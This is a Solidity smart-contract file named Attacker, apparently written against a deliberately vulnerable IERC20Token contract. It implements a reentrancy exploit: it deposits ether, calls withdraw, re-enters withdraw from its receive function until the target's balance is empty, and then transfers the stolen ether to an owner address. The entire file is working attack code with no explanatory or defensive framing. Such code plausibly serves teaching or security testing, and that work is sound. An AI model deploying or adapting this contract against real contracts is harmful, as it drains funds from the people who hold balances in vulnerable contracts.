// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./IERC20Token.sol";

contract Attacker {
    IERC20Token _erc20;
    address private _ownerAddress;

    constructor(address tokenAddress, address ownerAddress) {
        _erc20 = IERC20Token(tokenAddress);
        _ownerAddress = ownerAddress;
    }

    function attack() external payable {
        _erc20.deposit{value: msg.value}();
        _erc20.withdraw();
    }

    receive() external payable {
        if (address(_erc20).balance > 0) {
            _erc20.withdraw();
        } else {
            payable(_ownerAddress).transfer(address(this).balance);
        }
    }
}
